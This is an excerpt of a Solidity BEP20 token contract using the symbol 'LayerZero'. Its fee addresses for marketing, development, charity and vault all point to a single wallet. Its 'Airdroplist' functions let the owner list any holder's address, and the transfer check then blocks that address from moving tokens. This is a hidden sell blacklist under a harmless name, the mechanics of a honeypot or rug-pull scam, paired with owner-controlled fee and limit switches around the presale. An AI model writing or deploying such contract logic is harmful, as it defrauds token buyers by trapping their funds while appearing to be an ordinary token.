...
contract Cont333 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
 
 
    address payable public marketingAddress = payable(0xC2baA96510e95B68fa774D458Da25dbb7FbBEEbb); 
    address payable public developmentAddress = payable(0xC2baA96510e95B68fa774D458Da25dbb7FbBEEbb); 
    address payable public charityAddress = payable(0xC2baA96510e95B68fa774D458Da25dbb7FbBEEbb); 
    address payable public vaultRewardAddress = payable(0xC2baA96510e95B68fa774D458Da25dbb7FbBEEbb); 
    ...
    mapping(address => bool) private _isAirdroplist;
    ...
    string private constant _symbol = "LayerZero";
    ...
    uint256 public _vaultFee = 1;
    uint256 public _liquidityFee = 10; // liquidity + all team fees
    ...
    uint256 public _bMaxTxAmount = 100000000  * 10**9;
    uint256 public _sMaxTxAmount = 100000000  * 10**9;
    uint256 private _trigger = 100000000  * 10**9;
    ...
    function _transfer(
        ...
        require(
            !_isAirdroplist[from],
            "BEP20: transfer from Airdrop-listed address"
        );
    ...
    function airdroplist() external view returns (address[] memory) {
        return _airdroplist;
    }
    function addToAirdroplist(address account) external onlyOwner returns (bool) {
        _addToAirdroplist(account);
        return true;
    }
 
    function _addToAirdroplist(address account) internal {
        require(account != address(0), "BEP20: can not Airdrop zero address");
        require(account != owner(), "BEP20: can not Airdrop owner");
        require(!_isAirdroplist[account], "BEP20: address already Airdropped");
 
        _isAirdroplist[account] = true;
        _airdroplist.push(account);
    }
 
    function removeFromAirdroplist(address account)
        external
        onlyOwner
        returns (bool)
    {
        _removeFromAirdroplist(account);
        return true;
    }
 
    function _removeFromAirdroplist(address account) internal {
        require(_isAirdroplist[account], "BEP20: address not in the Airdrop list");
        for (uint256 i = 0; i < _airdroplist.length; i++) {
            if (_airdroplist[i] == account) {
                if (_airdroplist.length > 1) {
                    // if can be replaced with the last element
                    _airdroplist[i] = _airdroplist[_airdroplist.length - 1];
                }
                _airdroplist.pop();
                _isAirdroplist[account] = false;
                break;
            }
        }
    }
    ...
    function prepareForPreSale() external onlyOwner {
        ...
        _vaultFee = 0;
        _liquidityFee = 0;
        _bMaxTxAmount = 1000000000 * 10**9;
        _sMaxTxAmount = 1000000000 * 10**9;
    }
    ...
    function afterPreSale() external onlyOwner {
        ...
        _vaultFee = 1;
        _liquidityFee = 10;
        _bMaxTxAmount = 6000000 * 10**9;
        _sMaxTxAmount = 3000000 * 10**9;
        setTradingOpen(true);
    }
    ...
    //Create additional liquidity using Chain tokens in contract
